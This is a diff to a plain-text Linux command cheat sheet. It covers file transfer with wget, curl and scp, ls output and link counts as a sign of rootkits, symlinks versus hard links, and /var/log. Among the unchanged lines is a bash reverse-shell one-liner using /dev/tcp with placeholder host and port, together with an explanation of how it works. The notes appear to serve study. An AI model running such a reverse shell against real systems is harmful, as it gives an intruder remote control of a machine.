@@ -223,9 +223,7 @@ Show accesible networks:          netstat -rn
 Download file from server - wget: wget <url> (wget supports HTTP, HTTPS, and FTP; see curl for a powerful alternative to transfer data from or to a server)
 Download file from server - curl: curl -L <url> -o <file>
 Download/upload file using SCP:   scp <source> <destination> e.g.: scp user@192.168.1.23:/root/file.txt transferred.txt | scp file.txt user@192.168.1.23:/home/user/transferred.txt
-
 Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (requires a bash shell, otherwise wrap it with 'bash -c "<command>"')
-
 The code to start a reverse shell runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>&), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).
 
 
@@ -254,14 +252,12 @@ Virtual machines networking configurations:
 
 
 Understanding ls command output:
-
 The columns of the output in the long listing format are from left to right: file type and permissions, link count, owner, group, file size, last modified date, and file name.
-
 Unix file systems keep track of a "link count" to all objects in the file system. This "link count" value is the number of different directory entries that all point to the inode associated with the object. In the case of a regular file, the link count is the number of hard links to that file. However, Unix file systems don't let you create hard links to directories, yet the link count on a directory is always at least two. Why is this so? There are pointers from parent directories to child directories, and viceversa (the ".." link). And every dir contains the "." link that points back to itself.
 If a kernel-level rootkit would be used to hide a directory, the link count would betray this discrepancy. It's very easy to write a tool to detect hidden dirs. This is part of the chkrootkit tool (checks for signs of rootkits).
 
 
-Symbolic links (Linux shortcuts):
+Links (Linux shortcuts and dup file node):
 A symlink (also called a symbolic link) is a type of file in Linux that points to another file or a folder on your computer. Symlinks are similar to shortcuts in Windows.
 In Linux systems, the data structure that does the actual storing of information is called an Inode. A hard link is a file all its own, and the file references or points to the exact spot on a hard drive where the Inode stores the data. A soft link isn't a separate file, it points to the name of the original file, rather than to a spot on the hard drive.
 ln is the link command. By default, ln creates hard links, add the -s flag to make it soft.
@@ -428,4 +424,3 @@ Logs:
 
 Located in the /var/log directory, these files and folders contain logging information for applications and services running on your system.
 These services and logs are a great way in monitoring the health of your system and protecting it. Not only that, but the logs for services such as a web server contain information about every single request - allowing developers or administrators to diagnose performance issues or investigate an intruder's activity.
-
